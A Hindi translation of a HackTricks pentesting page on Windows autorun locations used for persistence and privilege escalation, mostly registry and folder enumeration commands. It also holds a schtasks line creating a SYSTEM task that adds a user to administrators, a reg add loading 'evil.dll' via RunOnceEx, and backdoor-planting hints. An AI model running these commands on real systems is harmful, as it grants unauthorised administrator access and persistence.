# Autoruns के साथ प्रिविलेज एस्केलेशन

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_पोलिश भाषा में धाराप्रवाह लिखित और बोलचाल की आवश्यकता है_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** का उपयोग **स्टार्टअप** पर प्रोग्राम्स चलाने के लिए किया जा सकता है। देखें कि कौन से बाइनरीज स्टार्टअप पर चलने के लिए प्रोग्राम किए गए हैं:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## निर्धारित कार्य

**कार्यों** को **निश्चित आवृत्ति** के साथ चलाने के लिए निर्धारित किया जा सकता है। देखें कि कौन से बाइनरीज निर्धारित समय पर चलने के लिए तय किए गए हैं:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## फोल्डर्स

**स्टार्टअप फोल्डर्स में स्थित सभी बाइनरीज स्टार्टअप पर निष्पादित की जाएंगी**। सामान्य स्टार्टअप फोल्डर्स निम्नलिखित हैं, लेकिन स्टार्टअप फोल्डर का संकेत रजिस्ट्री में दिया गया है। [जानने के लिए यह पढ़ें।](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## रजिस्ट्री

{% hint style="info" %}
ध्यान दें: **Wow6432Node** रजिस्ट्री प्रविष्टि दर्शाती है कि आप 64-बिट Windows संस्करण चला रहे हैं। ऑपरेटिंग सिस्टम इस कुंजी का उपयोग 64-बिट Windows संस्करणों पर चलने वाले 32-बिट अनुप्रयोगों के लिए HKEY_LOCAL_MACHINE\SOFTWARE का अलग दृश्य प्रदर्शित करने के लिए करता है।
{% endhint %}

### रन्स

**सामान्यतः ज्ञात** AutoRun रजिस्ट्री:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Run और RunOnce रजिस्ट्री कुंजियाँ कार्यक्रमों को हर बार चलाती हैं जब एक उपयोगकर्ता लॉग इन करता है। एक कुंजी के लिए डेटा मान एक कमांड लाइन होती है जो 260 अक्षरों से अधिक नहीं होती।

**सर्विस रन्स** (बूट के दौरान सेवाओं की स्वचालित शुरुआत को नियंत्रित कर सकते हैं):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

यह Windows Vista और नए संस्करणों पर डिफ़ॉल्ट रूप से नहीं बनाया गया है। रजिस्ट्री रन कुंजी प्रविष्टियाँ सीधे कार्यक्रमों को संदर्भित कर सकती हैं या उन्हें एक निर्भरता के रूप में सूचीबद्ध कर सकती हैं। उदाहरण के लिए, लॉगऑन का उपयोग करते हुए एक "Depend" कुंजी के साथ RunOnceEx का उपयोग करके एक DLL लोड करना संभव है: `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"`

{% hint style="info" %}
**Exploit 1**: यदि आप **HKLM** के भीतर उल्लिखित किसी भी रजिस्ट्री में लिख सकते हैं, तो आप विभिन्न उपयोगकर्ता के लॉग इन करने पर विशेषाधिकार बढ़ा सकते हैं।
{% endhint %}

{% hint style="info" %}
**Exploit 2**: यदि आप **HKLM** के भीतर किसी भी रजिस्ट्री में दर्शाए गए किसी भी बाइनरी को ओवरराइट कर सकते हैं, तो आप उस बाइनरी को एक बैकडोर के साथ संशोधित कर सकते हैं जब एक विभिन्न उपयोगकर्ता लॉग इन करता है और विशेषाधिकार बढ़ा सकते हैं।
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### स्टार्टअप पथ

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

किसी भी शॉर्टकट को सबकी Startup द्वारा निर्देशित स्थान पर बनाया जाता है, वह सेवा लॉगऑन/रिबूट के दौरान लॉन्च होगी। स्टार्टअप स्थान Local Machine और Current User दोनों पर निर्दिष्ट है।

{% hint style="info" %}
यदि आप **HKLM** के अंतर्गत किसी भी \[User] Shell Folder को ओवरराइट कर सकते हैं, तो आप इसे अपने नियंत्रण वाले फोल्डर की ओर इंगित कर सकते हैं और एक बैकडोर रख सकते हैं जो किसी भी समय जब उपयोगकर्ता सिस्टम में लॉग इन करता है, निष्पादित होगा, जिससे विशेषाधिकार बढ़ाए जा सकते हैं।
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon कुंजियाँ

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

आमतौर पर, **Userinit** कुंजी userinit.exe की ओर इशारा करती है लेकिन अगर इस कुंजी को बदला जा सकता है, तो वह exe भी Winlogon द्वारा लॉन्च की जाएगी।\
**Shell** कुंजी को explorer.exe की ओर इशारा करना चाहिए।
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
यदि आप रजिस्ट्री मान या बाइनरी को ओवरराइट कर सकते हैं, तो आप विशेषाधिकारों को बढ़ा सकते हैं।
{% endhint %}

### नीति सेटिंग्स

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** कुंजी की जाँच करें।
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

पथ: **`HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`**

रजिस्ट्री कुंजी `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot` के अंतर्गत **AlternateShell** मान होता है, जो डिफ़ॉल्ट रूप से `cmd.exe` (कमांड प्रॉम्प्ट) पर सेट होता है। जब आप स्टार्टअप के दौरान F8 दबाते हैं और "Safe Mode with Command Prompt" चुनते हैं, तो सिस्टम इस वैकल्पिक शेल का उपयोग करता है।\
हालांकि, आप एक बूट विकल्प बना सकते हैं ताकि आपको F8 दबाने की और फिर "Safe Mode with Command Prompt" चुनने की आवश्यकता न हो।

1. बूट.ini (c:\boot.ini) फ़ाइल विशेषताओं को संपादित करें ताकि फ़ाइल को नॉनरीड-ओनली, नॉनसिस्टम, और नॉनहिडन बनाया जा सके (attrib c:\boot.ini -r -s -h)।
2. बूट.ini खोलें।
3. निम्नलिखित के समान एक पंक्ति जोड़ें: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. फ़ाइल सहेजें।
5. सही अनुमतियाँ पुनः लागू करें (attrib c:\boot.ini +r +s +h)।

[यहाँ](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell) से जानकारी।

{% hint style="info" %}
**Exploit 1:** यदि आप इस रजिस्ट्री कुंजी को संशोधित कर सकते हैं तो आप अपने बैकडोर को इंगित कर सकते हैं।
{% endhint %}

{% hint style="info" %}
**Exploit 2 (PATH लिखने की अनुमति)**: यदि आपके पास सिस्टम **PATH** के किसी भी फ़ोल्डर पर लिखने की अनुमति है _C:\Windows\system32_ से पहले (या यदि आप इसे बदल सकते हैं) तो आप एक cmd.exe फ़ाइल बना सकते हैं और यदि कोई सेफ मोड में मशीन शुरू करता है तो आपका बैकडोर निष्पादित होगा।
{% endhint %}

{% hint style="info" %}
**Exploit 3 (PATH लिखने की अनुमति और boot.ini लिखने की अनुमति)**: यदि आप boot.ini लिख सकते हैं, तो आप अगले रिबूट के लिए सेफ मोड में स्टार्टअप को स्वचालित कर सकते हैं।
{% endhint %}
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### स्थापित घटक

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Active Setup डेस्कटॉप दिखाई देने से पहले चलता है। Active Setup द्वारा शुरू किए गए कमांड सिंक्रोनसली चलते हैं, जो लॉगऑन के दौरान उनके निष्पादन को रोकते हैं। Active Setup किसी भी Run या RunOnce रजिस्ट्री प्रविष्टियों के मूल्यांकन से पहले निष्पादित होता है।

उन कुंजियों के अंदर आपको और अधिक कुंजियाँ मिलेंगी और प्रत्येक कुंजी के लिए कुछ दिलचस्प की-वैल्यूज़ होंगी। सबसे दिलचस्प वाले हैं:

* **IsInstalled:**
* 0: घटक का कमांड नहीं चलेगा।
* 1: घटक का कमांड प्रति उपयोगकर्ता एक बार चलेगा। यह डिफ़ॉल्ट है (यदि IsInstalled मान मौजूद नहीं है)।
* **StubPath**
* प्रारूप: कोई भी मान्य कमांड लाइन, उदाहरण के लिए “notepad”
* यह वह कमांड है जो निष्पादित की जाती है यदि Active Setup निर्धारित करता है कि इस घटक को लॉगऑन के दौरान चलाने की आवश्यकता है।

{% hint style="info" %}
यदि आप _**IsInstalled == "1"**_ के साथ किसी भी कुंजी पर लिख/ओवरराइट कर सकते हैं तो कुंजी **StubPath**, आप इसे एक बैकडोर की ओर इंगित कर सकते हैं और विशेषाधिकारों को बढ़ा सकते हैं। इसी तरह, यदि आप किसी भी **बाइनरी** को ओवरराइट कर सकते हैं जिसे किसी **StubPath** कुंजी द्वारा इंगित किया गया है, तो आप विशेषाधिकारों को बढ़ा सकते हैं।
{% endhint %}
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### ब्राउज़र हेल्पर ऑब्जेक्ट्स

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

एक **Browser Helper Object** (**BHO**) एक DLL मॉड्यूल है जिसे Microsoft के Internet Explorer वेब ब्राउज़र के लिए प्लगइन के रूप में डिज़ाइन किया गया है ताकि अतिरिक्त कार्यक्षमता प्रदान की जा सके। ये मॉड्यूल Internet Explorer के प्रत्येक नए इंस्टेंस और Windows Explorer के प्रत्येक नए इंस्टेंस के लिए निष्पादित किए जाते हैं। हालांकि, एक BHO को Explorer के प्रत्येक इंस्टेंस द्वारा निष्पादित होने से रोका जा सकता है यदि कुंजी **NoExplorer** को 1 पर सेट किया जाए।

BHOs अभी भी Windows 10 में समर्थित हैं, Internet Explorer 11 के माध्यम से, जबकि BHOs को डिफ़ॉल्ट वेब ब्राउज़र Microsoft Edge में समर्थित नहीं किया जाता है।
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### इंटरनेट एक्सप्लोरर एक्सटेंशन्स

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

ध्यान दें कि रजिस्ट्री में प्रत्येक dll के लिए 1 नया रजिस्ट्री होगा और इसे **CLSID** द्वारा प्रतिनिधित्व किया जाएगा। आप `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` में CLSID की जानकारी पा सकते हैं।

### फॉन्ट ड्राइवर्स

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### ओपन कमांड

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### इमेज फाइल एक्जीक्यूशन ऑप्शंस
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

ध्यान दें कि सभी साइटें जहां आप autoruns पा सकते हैं, वे **पहले से ही** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) **द्वारा खोजी जा चुकी हैं**। हालांकि, ऑटो-निष्पादित फाइलों की **एक अधिक व्यापक सूची के लिए** आप systinternals से [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) का उपयोग कर सकते हैं:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## अधिक

[https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) में रजिस्ट्रीज की तरह और भी Autoruns खोजें।

## संदर्भ

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **hacking career** में रुचि रखते हैं और असंभव को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_धाराप्रवाह पोलिश लिखित और बोली जाने वाली आवश्यकता है_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) पर **फॉलो** करें।
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
